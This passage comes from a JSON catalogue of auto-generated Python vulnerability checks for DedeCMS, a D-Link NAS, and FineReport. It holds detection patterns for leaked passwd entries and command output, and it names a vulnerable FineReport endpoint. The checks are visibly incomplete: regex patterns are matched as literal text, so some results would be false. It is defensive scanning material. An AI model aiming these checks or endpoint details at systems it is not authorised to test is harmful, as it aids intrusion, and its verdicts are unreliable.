_check_matchers(self, response: Dict) -> bool:\n        \"\"\"Check response against matchers.\"\"\"\n        body = response.get(\"body\", \"\")\n        headers = str(response.get(\"headers\", {}))\n        status = response.get(\"status_code\", 0)\n\n        # TODO: Implement specific matchers from template\n        # Current: basic string matching from detection summary\n        detection = \"[AND] regex ['root:[x*]:0:0'] | status HTTP [200]\"\n\n        # Simple word matcher simulation\n        matchers = ['root:[x*]:0:0']\n\n        for matcher in matchers:\n            if matcher.lower() in body.lower():\n                return True\n            if matcher.lower() in headers.lower():\n                return True\n\n        return False\n\n    def _run_extractors(self, response: Dict) -> List[str]:\n        \"\"\"Run extractors on response.\"\"\"\n        extracted = []\n        body = response.get(\"body\", \"\")\n\n        # Regex extractors (simplified)\n        # TODO: Parse actual regex patterns from template\n\n        return extracted\n\n    def _on_match(self, result: Dict):\n        \"\"\"Handle match event.\"\"\"\n        print(f\"[MATCH] {result['name']} on {result['target']}\")\n        print(f\"        Severity: {result['severity']}\")\n\n    def _on_no_match(self, result: Dict):\n        \"\"\"Handle no-match event.\"\"\"\n        print(f\"[NO MATCH] {result['name']} on {result['target']}\")\n\n    def _on_error(self, error: Exception):\n        \"\"\"Handle error event.\"\"\"\n        print(f\"[ERROR] {error}\", file=sys.stderr)\n\n\ndef main():\n    \"\"\"CLI entry point.\"\"\"\n    import argparse\n    parser = argparse.ArgumentParser(description=\"DedeCMS 5.8.1-beta - Remote Code Execution\")\n    parser.add_argument(\"target\", help=\"Target URL/hostname\")\n    parser.add_argument(\"--proxy\", help=\"Proxy URL\")\n    parser.add_argument(\"--timeout\", type=int, default=10)\n    args = parser.parse_args()\n\n    checker = NucleiCheck_dedecms_rce(\n        target=args.target,\n        proxy=args.proxy,\n        timeout=args.timeout\n    )\n    result = checker.run()\n\n    print(json.dumps(result, indent=2, ensure_ascii=False))\n    sys.exit(0 if result[\"matched\"] else 1)\n\n\nif __name__ == \"__main__\":\n    main()",
        "cve": [],
        "tags": [
          "dedecms",
          "cms",
          "rce",
          "vuln"
        ],
        "cvss_score": 10.0
      },
      {
        "id": "fn_nuclei_dlink_nas_rce",
        "name": "D-Link NAS `sc_mgr.cgi` - Remote Code Execution",
        "language": "Python",
        "famille": "WebApp",
        "description": "The D-Link NAS interface sc_mgr.cgi contains a command execution vulnerability that allows attackers to execute arbitrary commands on the device, potentially leading to unauthorized access or control over the system.",
        "severity": "critical",
        "detection": "[AND] regex ['uid=([0-9(a-z)]+) gid=([0-9(a-z)]+)', '404 not found'] | status HTTP [200]",
        "parameters": [
          {
            "name": "target",
            "datatype": "string",
            "required": true,
            "description": "Hostname ou IP de la cible"
          }
        ],
        "returns": {
          "datatype": "Finding",
          "description": "Résultat de la détection : matched (bool), extracted_values (list), severity, template_id"
        },
        "source": "#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\"\"\"\nNuclei Template: dlink-nas-rce\nName: D-Link NAS `sc_mgr.cgi` - Remote Code Execution\nSeverity: critical\nDescription: The D-Link NAS interface sc_mgr.cgi contains a command execution vulnerability that allows attackers to execute arbitrary commands on the device, potentially leading to unauthorized access or control over the system.\nAuto-generated by NucleiForge\n\"\"\"\n\nimport sys\nimport re\nimport json\nimport urllib.parse\nimport urllib.request\nfrom typing import List, Dict, Any, Optional\n\nclass NucleiCheck_dlink_nas_rce:\n    \"\"\"Detection check generated from Nuclei template.\"\"\"\n\n    TEMPLATE_ID = \"dlink-nas-rce\"\n    SEVERITY = \"critical\"\n    NAME = \"D-Link NAS `sc_mgr.cgi` - Remote Code Execution\"\n\n    def __init__(self, target: str, **kwargs):\n        self.target = target.rstrip('/')\n        self.protocol = \"http\"\n        self.timeout = kwargs.get('timeout', 10)\n        self.proxy = kwargs.get('proxy', None)\n        self.follow_redirects = kwargs.get('follow_redirects', True)\n\n    def run(self) -> Dict[str, Any]:\n        \"\"\"Execute the detection check.\"\"\"\n        result = {\n            \"template_id\": self.TEMPLATE_ID,\n            \"name\": self.NAME,\n            \"severity\": self.SEVERITY,\n            \"target\": self.target,\n            \"matched\": False,\n            \"extracted\": [],\n            \"error\": None\n        }\n\n        try:\n            url = self._build_url()\n            response = self._send_request(url)\n\n            if self._check_matchers(response):\n                result[\"matched\"] = True\n                result[\"extracted\"] = self._run_extractors(response)\n                self._on_match(result)\n            else:\n                self._on_no_match(result)\n\n        except Exception as e:\n            result[\"error\"] = str(e)\n            self._on_error(e)\n\n        return result\n\n    def _build_url(self) -> str:\n        \"\"\"Construct target URL.\"\"\"\n        path = \"/\"\n        # Replace Nuclei variables\n        path = path.replace(\"{BaseURL}\", self.target)\n        path = path.replace(\"{BasePath}\", \"/\")\n        path = path.replace(\"{RootURL}\", self.target)\n        path = path.replace(\"{Hostname}\", urllib.parse.urlparse(self.target).hostname or self.target)\n        path = path.replace(\"{Port}\", str(urllib.parse.urlparse(self.target).port or\n                                          (443 if self.protocol == \"https\" else 80)))\n        path = path.replace(\"{Path}\", \"/\")\n        path = path.replace(\"{Scheme}\", self.protocol)\n\n        # Random strings (simplified)\n        import random, string\n        path = re.sub(r'{randstr}', lambda m: ''.join(random.choices(string.ascii_lowercase, k=8)), path)\n        path = re.sub(r'{rand_int}', lambda m: str(random.randint(1000, 9999)), path)\n\n        return urllib.parse.urljoin(self.target, path)\n\n    def _send_request(self, url: str) -> Dict[str, Any]:\n        \"\"\"Send HTTP request and return response dict.\"\"\"\n        import urllib.request\n        import ssl\n\n        req = urllib.request.Request(url, method=\"GET\")\n\n        # Headers\n        headers = {}\n        for k, v in headers.items():\n            req.add_header(k, v)\n\n        # SSL context\n        ctx = ssl.create_default_context()\n        ctx.check_hostname = False\n        ctx.verify_mode = ssl.CERT_NONE\n\n        # Proxy\n        if self.proxy:\n            req.set_proxy(self.proxy, 'http')\n\n        # Body\n        body = None\n        if body:\n            req.data = body.encode('utf-8')\n            if 'Content-Type' not in headers:\n                req.add_header('Content-Type', 'application/x-www-form-urlencoded')\n\n        response = urllib.request.urlopen(req, timeout=self.timeout, context=ctx)\n\n        return {\n            \"status_code\": response.getcode(),\n            \"headers\": dict(response.headers),\n            \"body\": response.read().decode('utf-8', errors='replace'),\n            \"url\": response.geturl()\n        }\n\n    def _check_matchers(self, response: Dict) -> bool:\n        \"\"\"Check response against matchers.\"\"\"\n        body = response.get(\"body\", \"\")\n        headers = str(response.get(\"headers\", {}))\n        status = response.get(\"status_code\", 0)\n\n        # TODO: Implement specific matchers from template\n        # Current: basic string matching from detection summary\n        detection = \"[AND] regex ['uid=([0-9(a-z)]+) gid=([0-9(a-z)]+)', '404 not found'] | status HTTP [200]\"\n\n        # Simple word matcher simulation\n        matchers = ['uid=([0-9(a-z)]+) gid=([0-9(a-z)]+)', '404 not found']\n\n        for matcher in matchers:\n            if matcher.lower() in body.lower():\n                return True\n            if matcher.lower() in headers.lower():\n                return True\n\n        return False\n\n    def _run_extractors(self, response: Dict) -> List[str]:\n        \"\"\"Run extractors on response.\"\"\"\n        extracted = []\n        body = response.get(\"body\", \"\")\n\n        # Regex extractors (simplified)\n        # TODO: Parse actual regex patterns from template\n\n        return extracted\n\n    def _on_match(self, result: Dict):\n        \"\"\"Handle match event.\"\"\"\n        print(f\"[MATCH] {result['name']} on {result['target']}\")\n        print(f\"        Severity: {result['severity']}\")\n\n    def _on_no_match(self, result: Dict):\n        \"\"\"Handle no-match event.\"\"\"\n        print(f\"[NO MATCH] {result['name']} on {result['target']}\")\n\n    def _on_error(self, error: Exception):\n        \"\"\"Handle error event.\"\"\"\n        print(f\"[ERROR] {error}\", file=sys.stderr)\n\n\ndef main():\n    \"\"\"CLI entry point.\"\"\"\n    import argparse\n    parser = argparse.ArgumentParser(description=\"D-Link NAS `sc_mgr.cgi` - Remote Code Execution\")\n    parser.add_argument(\"target\", help=\"Target URL/hostname\")\n    parser.add_argument(\"--proxy\", help=\"Proxy URL\")\n    parser.add_argument(\"--timeout\", type=int, default=10)\n    args = parser.parse_args()\n\n    checker = NucleiCheck_dlink_nas_rce(\n        target=args.target,\n        proxy=args.proxy,\n        timeout=args.timeout\n    )\n    result = checker.run()\n\n    print(json.dumps(result, indent=2, ensure_ascii=False))\n    sys.exit(0 if result[\"matched\"] else 1)\n\n\nif __name__ == \"__main__\":\n    main()",
        "source_original": "#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\"\"\"\nNuclei Template: dlink-nas-rce\nName: D-Link NAS `sc_mgr.cgi` - Remote Code Execution\nSeverity: critical\nDescription: The D-Link NAS interface sc_mgr.cgi contains a command execution vulnerability that allows attackers to execute arbitrary commands on the device, potentially leading to unauthorized access or control over the system.\nAuto-generated by NucleiForge\n\"\"\"\n\nimport sys\nimport re\nimport json\nimport urllib.parse\nimport urllib.request\nfrom typing import List, Dict, Any, Optional\n\nclass NucleiCheck_dlink_nas_rce:\n    \"\"\"Detection check generated from Nuclei template.\"\"\"\n\n    TEMPLATE_ID = \"dlink-nas-rce\"\n    SEVERITY = \"critical\"\n    NAME = \"D-Link NAS `sc_mgr.cgi` - Remote Code Execution\"\n\n    def __init__(self, target: str, **kwargs):\n        self.target = target.rstrip('/')\n        self.protocol = \"http\"\n        self.timeout = kwargs.get('timeout', 10)\n        self.proxy = kwargs.get('proxy', None)\n        self.follow_redirects = kwargs.get('follow_redirects', True)\n\n    def run(self) -> Dict[str, Any]:\n        \"\"\"Execute the detection check.\"\"\"\n        result = {\n            \"template_id\": self.TEMPLATE_ID,\n            \"name\": self.NAME,\n            \"severity\": self.SEVERITY,\n            \"target\": self.target,\n            \"matched\": False,\n            \"extracted\": [],\n            \"error\": None\n        }\n\n        try:\n            url = self._build_url()\n            response = self._send_request(url)\n\n            if self._check_matchers(response):\n                result[\"matched\"] = True\n                result[\"extracted\"] = self._run_extractors(response)\n                self._on_match(result)\n            else:\n                self._on_no_match(result)\n\n        except Exception as e:\n            result[\"error\"] = str(e)\n            self._on_error(e)\n\n        return result\n\n    def _build_url(self) -> str:\n        \"\"\"Construct target URL.\"\"\"\n        path = \"/\"\n        # Replace Nuclei variables\n        path = path.replace(\"{BaseURL}\", self.target)\n        path = path.replace(\"{BasePath}\", \"/\")\n        path = path.replace(\"{RootURL}\", self.target)\n        path = path.replace(\"{Hostname}\", urllib.parse.urlparse(self.target).hostname or self.target)\n        path = path.replace(\"{Port}\", str(urllib.parse.urlparse(self.target).port or\n                                          (443 if self.protocol == \"https\" else 80)))\n        path = path.replace(\"{Path}\", \"/\")\n        path = path.replace(\"{Scheme}\", self.protocol)\n\n        # Random strings (simplified)\n        import random, string\n        path = re.sub(r'{randstr}', lambda m: ''.join(random.choices(string.ascii_lowercase, k=8)), path)\n        path = re.sub(r'{rand_int}', lambda m: str(random.randint(1000, 9999)), path)\n\n        return urllib.parse.urljoin(self.target, path)\n\n    def _send_request(self, url: str) -> Dict[str, Any]:\n        \"\"\"Send HTTP request and return response dict.\"\"\"\n        import urllib.request\n        import ssl\n\n        req = urllib.request.Request(url, method=\"GET\")\n\n        # Headers\n        headers = {}\n        for k, v in headers.items():\n            req.add_header(k, v)\n\n        # SSL context\n        ctx = ssl.create_default_context()\n        ctx.check_hostname = False\n        ctx.verify_mode = ssl.CERT_NONE\n\n        # Proxy\n        if self.proxy:\n            req.set_proxy(self.proxy, 'http')\n\n        # Body\n        body = None\n        if body:\n            req.data = body.encode('utf-8')\n            if 'Content-Type' not in headers:\n                req.add_header('Content-Type', 'application/x-www-form-urlencoded')\n\n        response = urllib.request.urlopen(req, timeout=self.timeout, context=ctx)\n\n        return {\n            \"status_code\": response.getcode(),\n            \"headers\": dict(response.headers),\n            \"body\": response.read().decode('utf-8', errors='replace'),\n            \"url\": response.geturl()\n        }\n\n    def _check_matchers(self, response: Dict) -> bool:\n        \"\"\"Check response against matchers.\"\"\"\n        body = response.get(\"body\", \"\")\n        headers = str(response.get(\"headers\", {}))\n        status = response.get(\"status_code\", 0)\n\n        # TODO: Implement specific matchers from template\n        # Current: basic string matching from detection summary\n        detection = \"[AND] regex ['uid=([0-9(a-z)]+) gid=([0-9(a-z)]+)', '404 not found'] | status HTTP [200]\"\n\n        # Simple word matcher simulation\n        matchers = ['uid=([0-9(a-z)]+) gid=([0-9(a-z)]+)', '404 not found']\n\n        for matcher in matchers:\n            if matcher.lower() in body.lower():\n                return True\n            if matcher.lower() in headers.lower():\n                return True\n\n        return False\n\n    def _run_extractors(self, response: Dict) -> List[str]:\n        \"\"\"Run extractors on response.\"\"\"\n        extracted = []\n        body = response.get(\"body\", \"\")\n\n        # Regex extractors (simplified)\n        # TODO: Parse actual regex patterns from template\n\n        return extracted\n\n    def _on_match(self, result: Dict):\n        \"\"\"Handle match event.\"\"\"\n        print(f\"[MATCH] {result['name']} on {result['target']}\")\n        print(f\"        Severity: {result['severity']}\")\n\n    def _on_no_match(self, result: Dict):\n        \"\"\"Handle no-match event.\"\"\"\n        print(f\"[NO MATCH] {result['name']} on {result['target']}\")\n\n    def _on_error(self, error: Exception):\n        \"\"\"Handle error event.\"\"\"\n        print(f\"[ERROR] {error}\", file=sys.stderr)\n\n\ndef main():\n    \"\"\"CLI entry point.\"\"\"\n    import argparse\n    parser = argparse.ArgumentParser(description=\"D-Link NAS `sc_mgr.cgi` - Remote Code Execution\")\n    parser.add_argument(\"target\", help=\"Target URL/hostname\")\n    parser.add_argument(\"--proxy\", help=\"Proxy URL\")\n    parser.add_argument(\"--timeout\", type=int, default=10)\n    args = parser.parse_args()\n\n    checker = NucleiCheck_dlink_nas_rce(\n        target=args.target,\n        proxy=args.proxy,\n        timeout=args.timeout\n    )\n    result = checker.run()\n\n    print(json.dumps(result, indent=2, ensure_ascii=False))\n    sys.exit(0 if result[\"matched\"] else 1)\n\n\nif __name__ == \"__main__\":\n    main()",
        "cve": [],
        "tags": [
          "dlink",
          "nas",
          "rce",
          "vuln"
        ],
        "cvss_score": 10.0
      },
      {
        "id": "fn_nuclei_fine_report_v9_file_upload",
        "name": "FineReport v9 Arbitrary File Overwrite",
        "language": "Python",
        "famille": "WebApp",
        "description": "FineReport ( A business intelligence (BI) and reporting software ) is vulnerable to Arbitrary File Overwrite.",
        "severity": "critical",
        "detection": "[OR] mot(s) '{{string}}'",
        "parameters": [
          {
            "name": "target",
            "datatype": "string",
            "required": true,
            "description": "Hostname ou IP de la cible"
          },
          {
            "name": "string",
            "datatype": "string",
            "required": false,
            "description": "Variable Nuclei custom: string",
            "default": "{{rand_base(8, \"abc\")}}"
          },
          {
            "name": "filename",
            "datatype": "string",
            "required": false,
            "description": "Variable Nuclei custom: filename",
            "default": "{{rand_base(8)}}"
          }
        ],
        "returns": {
          "datatype": "Finding",
          "description": "Résultat de la détection : matched (bool), extracted_values (list), severity, template_id"
        },
        "source": "#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\"\"\"\nNuclei Template: fine-report-v9-file-upload\nName: FineReport v9 Arbitrary File Overwrite\nSeverity: critical\nDescription: FineReport ( A business intelligence (BI) and reporting software ) is vulnerable to Arbitrary File Overwrite.\nAuto-generated by NucleiForge\n\"\"\"\n\nimport sys\nimport re\nimport json\nimport urllib.parse\nimport urllib.request\nfrom typing import List, Dict, Any, Optional\n\nclass NucleiCheck_fine_report_v9_file_upload:\n    \"\"\"Detection check generated from Nuclei template.\"\"\"\n\n    TEMPLATE_ID = \"fine-report-v9-file-upload\"\n    SEVERITY = \"critical\"\n    NAME = \"FineReport v9 Arbitrary File Overwrite\"\n\n    def __init__(self, target: str, **kwargs):\n        self.target = target.rstrip('/')\n        self.protocol = \"http\"\n        self.timeout = kwargs.get('timeout', 10)\n        self.proxy = kwargs.get('proxy', None)\n        self.follow_redirects = kwargs.get('follow_redirects', True)\n\n    def run(self) -> Dict[str, Any]:\n        \"\"\"Execute the detection check.\"\"\"\n        result = {\n            \"template_id\": self.TEMPLATE_ID,\n            \"name\": self.NAME,\n            \"severity\": self.SEVERITY,\n            \"target\": self.target,\n            \"matched\": False,\n            \"extracted\": [],\n            \"error\": None\n        }\n\n        try:\n            url = self._build_url()\n            response = self._send_request(url)\n\n            if self._check_matchers(response):\n                result[\"matched\"] = True\n                result[\"extracted\"] = self._run_extractors(response)\n                self._on_match(result)\n            else:\n                self._on_no_match(result)\n\n        except Exception as e:\n            result[\"error\"] = str(e)\n            self._on_error(e)\n\n        return result\n\n    def _build_url(self) -> str:\n        \"\"\"Construct target URL.\"\"\"\n        path = \"/\"\n        # Replace Nuclei variables\n        path = path.replace(\"{BaseURL}\", self.target)\n        path = path.replace(\"{BasePath}\", \"/\")\n        path = path.replace(\"{RootURL}\", self.target)\n        path = path.replace(\"{Hostname}\", urllib.parse.urlparse(self.target).hostname or self.target)\n        path = path.replace(\"{Port}\", str(urllib.parse.urlparse(self.target).port or\n                                          (443 if self.protocol == \"https\" else 80)))\n        path = path.replace(\"{Path}\", \"/\")\n        path = path.replace(\"{Scheme}\", self.protocol)\n\n        # Random strings (simplified)\n        import random, string\n        path = re.sub(r'{randstr}', lambda m: ''.join(random.choices(string.ascii_lowercase, k=8)), path)\n        path = re.sub(r'{rand_int}', lambda m: str(random.randint(1000, 9999)), path)\n\n        return urllib.parse.urljoin(self.target, path)\n\n    def _send_request(self, url: str) -> Dict[str, Any]:\n        \"\"\"Send HTTP request and return response dict.\"\"\"\n        import urllib.request\n        import ssl\n\n        req = urllib.request.Request(url, method=\"GET\")\n\n        # Headers\n        headers = {}\n        for k, v in headers.items():\n            req.add_header(k, v)\n\n        # SSL context\n        ctx = ssl.create_default_context()\n        ctx.check_hostname = False\n        ctx.verify_mode = ssl.CERT_NONE\n\n        # Proxy\n        if self.proxy:\n            req.set_proxy(self.proxy, 'http')\n\n        # Body\n        body = None\n        if body:\n            req.data = body.encode('utf-8')\n            if 'Content-Type' not in headers:\n                req.add_header('Content-Type', 'application/x-www-form-urlencoded')\n\n        response = urllib.request.urlopen(req, timeout=self.timeout, context=ctx)\n\n        return {\n            \"status_code\": response.getcode(),\n            \"headers\": dict(response.headers),\n            \"body\": response.read().decode('utf-8', errors='replace'),\n            \"url\": response.geturl()\n        }\n\n    def _check_matchers(self, response: Dict) -> bool:\n        \"\"\"Check response against matchers.\"\"\"\n        body = response.get(\"body\", \"\")\n        headers = str(response.get(\"headers\", {}))\n        status = response.get(\"status_code\", 0)\n\n        # TODO: Implement specific matchers from template\n        # Current: basic string matching from detection summary\n        detection = \"[OR] mot(s) '{{string}}'\"\n\n        # Simple word matcher simulation\n        matchers = ['{{string}}']\n\n        for matcher in matchers:\n            if matcher.lower() in body.lower():\n                return True\n            if matcher.lower() in headers.lower():\n                return True\n\n        return False\n\n    def _run_extractors(self, response: Dict) -> List[str]:\n        \"\"\"Run extractors on response.\"\"\"\n        extracted = []\n        body = response.get(\"body\", \"\")\n\n        # Regex extractors (simplified)\n        # TODO: Parse actual regex patterns from template\n\n        return extracted\n\n    def _on_match(self, result: Dict):\n        \"\"\"Handle match event.\"\"\"\n        print(f\"[MATCH] {result['name']} on {result['target']}\")\n        print(f\"        Severity: {result['severity']}\")\n\n    def _on_no_match(self, result: Dict):\n        \"\"\"Handle no-match event.\"\"\"\n        print(f\"[NO MATCH] {result['name']} on {result['target']}\")\n\n    def _on_error(self, error: Exception):\n        \"\"\"Handle error event.\"\"\"\n        print(f\"[ERROR] {error}\", file=sys.stderr)\n\n\ndef main():\n    \"\"\"CLI entry point.\"\"\"\n    import argparse\n    parser = argparse.ArgumentParser(description=\"FineReport v9 Arbitrary File Overwrite\")\n    parser.add_argument(\"target\", help=\"Target URL/hostname\")\n    parser.add_argument(\"--proxy\", help=\"Proxy URL\")\n    parser.add_argument(\"--timeout\", type=int, default=10)\n    args = parser.parse_args()\n\n    checker = NucleiCheck_fine_report_v9_file_upload(\n        target=args.target,\n        proxy=args.proxy,\n        timeout=args.timeout\n    )\n    result = checker.run()\n\n    print(json.dumps(result, indent=2, ensure_ascii=False))\n    sys.exit(0 if result[\"matched\"] else 1)\n\n\nif __name__ == \"__main__\":\n    main()",
        "source_original": "#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\"\"\"\nNuclei Template: fine-report-v9-file-upload\nName: FineReport v9 Arbitrary File Overwrite\nSeverity: critical\nDescription: FineReport ( A business intelligence (BI) and reporting software ) is vulnerable to Arbitrary File Overwrite.\nAuto-generated by NucleiForge\n\"\"\"\n\nimport sys\nimport re\nimport json\nimport urllib.parse\nimport urllib.request\nfrom typing import List, Dict, Any, Optional\n\nclass NucleiCheck_fine_report_v9_file_upload:\n    \"\"\"Detection check generated from Nuclei template.\"\"\"\n\n    TEMPLATE_ID = \"fine-report-v9-file-upload\"\n    SEVERITY = \"critical\"\n    NAME = \"FineReport v9 Arbitrary File Overwrite\"\n\n    def __init__(self, target: str, **kwargs):\n        self.target = target.rstrip('/')\n        self.protocol = \"http\"\n        self.timeout = kwargs.get('timeout', 10)\n        self.proxy = kwargs.get('proxy', None)\n        self.follow_redirects = kwargs.get('follow_redirects', True)\n\n    def run(self) -> Dict[str, Any]:\n        \"\"\"Execute the detection check.\"\"\"\n        result = {\n            \"template_id\": self.TEMPLATE_ID,\n            \"name\": self.NAME,\n            \"severity\": self.SEVERITY,\n            \"target\": self.target,\n            \"matched\": False,\n            \"extracted\": [],\n            \"error\": None\n        }\n\n        try:\n            url = self._build_url()\n            response = self._send_request(url)\n\n            if self._check_matchers(response):\n                result[\"matched\"] = True\n                result[\"extracted\"] = self._run_extractors(response)\n                self._on_match(result)\n            else:\n                self._on_no_match(result)\n\n        except Exception as e:\n            result[\"error\"] = str(e)\n            self._on_error(e)\n\n        return result\n\n    def _build_url(self) -> str:\n        \"\"\"Construct target URL.\"\"\"\n        path = \"/\"\n        # Replace Nuclei variables\n        path = path.replace(\"{BaseURL}\", self.target)\n        path = path.replace(\"{BasePath}\", \"/\")\n        path = path.replace(\"{RootURL}\", self.target)\n        path = path.replace(\"{Hostname}\", urllib.parse.urlparse(self.target).hostname or self.target)\n        path = path.replace(\"{Port}\", str(urllib.parse.urlparse(self.target).port or\n                                          (443 if self.protocol == \"https\" else 80)))\n        path = path.replace(\"{Path}\", \"/\")\n        path = path.replace(\"{Scheme}\", self.protocol)\n\n        # Random strings (simplified)\n        import random, string\n        path = re.sub(r'{randstr}', lambda m: ''.join(random.choices(string.ascii_lowercase, k=8)), path)\n        path = re.sub(r'{rand_int}', lambda m: str(random.randint(1000, 9999)), path)\n\n        return urllib.parse.urljoin(self.target, path)\n\n    def _send_request(self, url: str) -> Dict[str, Any]:\n        \"\"\"Send HTTP request and return response dict.\"\"\"\n        import urllib.request\n        import ssl\n\n        req = urllib.request.Request(url, method=\"GET\")\n\n        # Headers\n        headers = {}\n        for k, v in headers.items():\n            req.add_header(k, v)\n\n        # SSL context\n        ctx = ssl.create_default_context()\n        ctx.check_hostname = False\n        ctx.verify_mode = ssl.CERT_NONE\n\n        # Proxy\n        if self.proxy:\n            req.set_proxy(self.proxy, 'http')\n\n        # Body\n        body = None\n        if body:\n            req.data = body.encode('utf-8')\n            if 'Content-Type' not in headers:\n                req.add_header('Content-Type', 'application/x-www-form-urlencoded')\n\n        response = urllib.request.urlopen(req, timeout=self.timeout, context=ctx)\n\n        return {\n            \"status_code\": response.getcode(),\n            \"headers\": dict(response.headers),\n            \"body\": response.read().decode('utf-8', errors='replace'),\n            \"url\": response.geturl()\n        }\n\n    def _check_matchers(self, response: Dict) -> bool:\n        \"\"\"Check response against matchers.\"\"\"\n        body = response.get(\"body\", \"\")\n        headers = str(response.get(\"headers\", {}))\n        status = response.get(\"status_code\", 0)\n\n        # TODO: Implement specific matchers from template\n        # Current: basic string matching from detection summary\n        detection = \"[OR] mot(s) '{{string}}'\"\n\n        # Simple word matcher simulation\n        matchers = ['{{string}}']\n\n        for matcher in matchers:\n            if matcher.lower() in body.lower():\n                return True\n            if matcher.lower() in headers.lower():\n                return True\n\n        return False\n\n    def _run_extractors(self, response: Dict) -> List[str]:\n        \"\"\"Run extractors on response.\"\"\"\n        extracted = []\n        body = response.get(\"body\", \"\")\n\n        # Regex extractors (simplified)\n        # TODO: Parse actual regex patterns from template\n\n        return extracted\n\n    def _on_match(self, result: Dict):\n        \"\"\"Handle match event.\"\"\"\n        print(f\"[MATCH] {result['name']} on {result['target']}\")\n        print(f\"        Severity: {result['severity']}\")\n\n    def _on_no_match(self, result: Dict):\n        \"\"\"Handle no-match event.\"\"\"\n        print(f\"[NO MATCH] {result['name']} on {result['target']}\")\n\n    def _on_error(self, error: Exception):\n        \"\"\"Handle error event.\"\"\"\n        print(f\"[ERROR] {error}\", file=sys.stderr)\n\n\ndef main():\n    \"\"\"CLI entry point.\"\"\"\n    import argparse\n    parser = argparse.ArgumentParser(description=\"FineReport v9 Arbitrary File Overwrite\")\n    parser.add_argument(\"target\", help=\"Target URL/hostname\")\n    parser.add_argument(\"--proxy\", help=\"Proxy URL\")\n    parser.add_argument(\"--timeout\", type=int, default=10)\n    args = parser.parse_args()\n\n    checker = NucleiCheck_fine_report_v9_file_upload(\n        target=args.target,\n        proxy=args.proxy,\n        timeout=args.timeout\n    )\n    result = checker.run()\n\n    print(json.dumps(result, indent=2, ensure_ascii=False))\n    sys.exit(0 if result[\"matched\"] else 1)\n\n\nif __name__ == \"__main__\":\n    main()",
        "cve": [],
        "tags": [
          "finereport",
          "fileupload",
          "intrusive",
          "vuln"
        ],
        "cvss_score": 10.0
      },
      {
        "id": "fn_nuclei_finereport_sqli_rce",
        "name": "FineReport SQLi - Remote Code Execution",
        "language": "Python",
        "famille": "WebApp",
        "description": "Access URL:/webroot/decision/view/ReportServer?test=&n=, which can execute the SQL statement in GET parameter n. This vulnerability is caused by Fanruan's own sqlite-jdbc-x.x.x.x.jar driver.",
        "severity": "critical",
        "detection": "[AND] mot(s) 'report?{{string}}&n=1147' | status HTTP [200, 302]",
        "parameters": [
          {
            "name": "target",
            "datatype": "string",
            "required": true,
            "description": "Hostname ou IP de la cible"
          },
          {
            "name": "string",
            "datatype": "string",
            "required": false,
            "description": "Variable Nuclei custom: string",
            "default": "{{rand_base(8, \"abc\")}}"
          }
        ],
        "returns": {
          "datatype": "Finding",
          "description": "Résultat de la détection : matched (bool), extracted_values (list), severity, template_id"
        },
        "source": "#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\"\"\"\nNuclei Template: finereport-sqli-rce\nName: FineReport SQLi - Remote Code Execution\nSeverity: critical\nDescription: Access URL:/webroot/decision/view/ReportServer?test=&n=, which can execute the SQL statement in GET parameter n. This vulnerability is caused by Fanruan's own sqlite-jdbc-x.x.x.x.jar driver.\nAuto-generated by NucleiForge\n\"\"\"\n\nimport sys\nimport re\nimport json\nimport urllib.parse\nimport urllib.request\nfrom typing import List, Dict, Any, Optional\n\nclass NucleiCheck_finereport_sqli_rce:\n    \"\"\"Detection check generated from Nuclei template.\"\"\"\n\n    TEMPLATE_ID = \"finereport-sqli-rce\"\n    SEVERITY = \"critical\"\n    NAME = \"FineReport SQLi - Remote Code Execution\"\n\n    def __init__(self, target: str, **kwargs):\n        self.target = target.rstrip('/')\n        self.protocol = \"http\"\n        self.timeout = kwargs.get('timeout', 10)\n        self.proxy = kwargs.get('proxy', None)\n        self.follow_redirects = kwargs.get('follow_redirects', True)\n\n    def run(self) -> Dict[str, Any]:\n        \"\"\"Execute the detection check.\"\"\"\n        result = {\n            \"template_id\": self.TEMPLATE_ID,\n            \"name\": self.NAME,\n            \"severity\": self.SEVERITY,\n            \"target\": self.target,\n            \"matched\": False,\n            \"extracted\": [],\n            \"error\": None\n        }\n\n        try:\n            url = self._build_url()\n            response = self._send_request(url)\n\n            if self._check_matchers(response):\n                result[\"matched\"] = True\n                result[\"extracted\"] = self._run_extractors(response)\n                self._on_match(result)\n            else:\n                self._on_no_match(result)\n\n        except Exception as e:\n            result[\"error\"] = str(e)\n            self._on_error(e)\n\n        return result\n\n    def _build_url(self) -> str:\n        \"\"\"Construct target URL.\"\"\"\n        path = \"/\"\n        # Replace Nuclei variables\n        path = path.replace(\"{BaseURL}\", self.target)\n        path = path.replace(\"{BasePath}\", \"/\")\n        path = path.replace(\"{RootURL}\", self.target)\n        path = path.replace(\"{Hostname}\", urllib.parse.urlparse(self.target).hostname or self.target)\n        path = path.replace(\"{Port}\", str(urllib.parse.urlparse(self.target).port or\n                                          (443 if self.protocol == \"https\" else 80)))\n        path = path.replace(\"{Path}\", \"/\")\n        path = path.replace(\"{Scheme}\", self.protocol)\n\n        # Random strings (simplified)\n        import random, string\n        path = re.sub(r'{randstr}', lambda m: ''.join(random.choices(string.ascii_lowercase, k=8)), path)\n        path = re.sub(r'{rand_int}', lambda m: str(random.randint(1000, 9999)), path)\n\n        return urllib.parse.urljoin(self.target, path)\n\n    def _send_request(self, url: str) -> Dict[str, Any]:\n        \"\"\"Send HTTP request and return response dict.\"\"\"\n        import urllib.request\n        import ssl\n\n        req = urllib.request.Request(url, method=\"GET\")\n\n        # Headers\n        headers = {}\n        for k, v in headers.items():\n            req.add_header(k, v)\n\n        # SSL context\n        ctx = ssl.create_default_context()\n        ctx.check_hostname = False\n        ctx.verify_mode = ssl.CERT_NONE\n\n        # Proxy\n        if self.proxy:\n            req.set_proxy(self.proxy, 'http')\n\n        # Body\n        body = None\n        if body:\n            req.data = body.encode('utf-8')\n            if 'Content-Type' not in headers:\n                req.add_header('Content-Type', 'application/x-www-form-urlencoded')\n\n        response = urllib.request.urlopen(req, timeout=self.timeout, context=ctx)\n\n        return {\n            \"status_code\": response.getcode(),\n            \"headers\": dict(response.headers),\n            \"body\": response.read().decode('utf-8', errors='replace'),\n            \"url\": response.geturl()\n        }\n\n    def _check_matchers(self, response: Dict) -> bool:\n        \"\"\"Check response against matchers.\"\"\"\n        body = response.get(\"body\", \"\")\n        headers = str(response.get(\"headers\", {}))\n        status = response.get(\"status_code\", 0)\n\n  